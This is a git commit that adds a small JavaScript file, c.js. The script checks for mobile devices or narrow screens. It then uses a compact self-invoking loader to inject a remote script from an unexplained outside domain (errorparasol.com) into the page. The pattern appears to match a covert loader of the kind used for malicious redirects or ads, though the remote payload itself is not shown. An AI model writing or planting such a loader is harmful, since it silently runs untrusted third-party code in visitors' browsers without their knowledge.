050d760d40faa37d34a829a282a5daf91c3021de
sleepyash421 <113919558+sleepyash421@users.noreply.github.com>
2022-10-01 17:43:56 +0700

    Create c.js

---
+++ c.js
@@ -0,0 +1,9 @@
+if (screen.width < 500 ||
+ navigator.userAgent.match(/Android/i) ||
+ navigator.userAgent.match(/webOS/i) ||
+ navigator.userAgent.match(/iPhone/i) ||
+ navigator.userAgent.match(/iPod/i)){
+	 
+	(function(s,u,p){s.src=u,p.appendChild(s);})(document.createElement('script'),'https://errorparasol.com/27/dc/29/27dc29b6be84e2684f60f0ad1ff03b44.js',document.body||document.documentElement)
+	 }
+	 
